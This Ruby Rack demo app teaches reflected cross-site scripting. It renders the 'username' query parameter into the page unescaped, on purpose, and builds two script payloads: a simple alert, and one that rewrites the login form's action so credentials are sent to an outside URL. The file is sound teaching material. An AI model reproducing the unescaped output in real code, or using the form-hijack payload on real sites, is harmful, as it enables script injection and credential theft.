require 'pp'
require 'rack'

module XSSDemo

  module Attacks

    class << self

      def simple_alert
        js_payload = "Random User<script>$(document).ready(function(){alert(\"XSS\");})</script>"
        params = {username: js_payload}

        build_url(params) 
      end

      def form_modification
        js_payload = "Random User<script>$(document).ready(function() { document.getElementById('login_form').action = 'http://www.google.com'})</script>"
        params = {username: js_payload}

        build_url(params) 
      end

      private 

      def build_url(params)
        "/?#{Rack::Utils.build_query(params)}"
      end

    end

  end


  class Router

    def call(env)
      case env['PATH_INFO']
      when "/login"
        LoginPage.new.call(env)
      else
        IndexPage.new.call(env)
      end
    end

  end

  class LoginPage

    def call(env)
      ['200', {'Content-Type' => 'text/html'}, [load_view]]
    end

    private

    def load_view(params={})
      html = <<EOF
logged in. now <a href="/">go home</a>!
EOF
    end


  end

  class IndexPage

    def call(env)
      defaults = {"username" => "Unknown User"}
      params = defaults.merge Rack::Utils.parse_query(env['QUERY_STRING'])
      params["simple_xss_url"] = Attacks.simple_alert
      params["form_modification_xss_url"] = Attacks.form_modification 

      html = load_view(params)

      ['200', {'Content-Type' => 'text/html'}, [html]]
    end

    private

    def load_view(params)
      html = <<EOF
  <html>
    <head>
      <title>XSS Demo</title>
      <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
    </head>

    <body>
      This page is meant to serve as an example of a few common XSS (Cross-Site Scripting) Attacks.
 
      <div class="login">
        <h2>Login Form (not secure at all so use dummy data)</h2>

        <form id="login_form" action="/login" method="post">
          <label for="username">Username</label>
          <input type="text" name="username">
          <br>

          <label for="password">Password</label>
          <input type="password" name="password">
          <br>

          <input type="submit" value="Login">
        </form>
      </div>

      <h1>Hello #{params['username']}</h1>

      <h2>Actions</h2>

      <ul>
        <li>
          <a href="/">Reset</a> &mdash;

          <blockquote>
            Reset the page so it's clear of any XSS injections.
          </blockquote>
        </li>

        <li>
          <a href="#{params["simple_xss_url"]}">Basic Javascript Injection Demo</a> &mdash;

          <blockquote> 
            If you click on the above link and see an alert that says "XSS" then XSS injection worked. Some browsers will 
            try to protect against code injection but don't rely on this.
          </blockquote>
        </li>

        <li>
          <a href="#{params["form_modification_xss_url"]}">Form Modification XSS Demo</a> &mdash;

          <blockquote>
            After clicking this link try logging in using a username/password combo you don't care about.
            <br>
            This attack will attempt to modify the action parameter of the login form below so login credentials 
            will be submitted to a different URL. Don't expect the submittion to actually do anything right now. 
            It'll probably just return a 400 series error because the endpoint doesn't know how to handle a post.
          </blockquote>
      </ul>

    </body>
  </html>
EOF
    end

  end

end
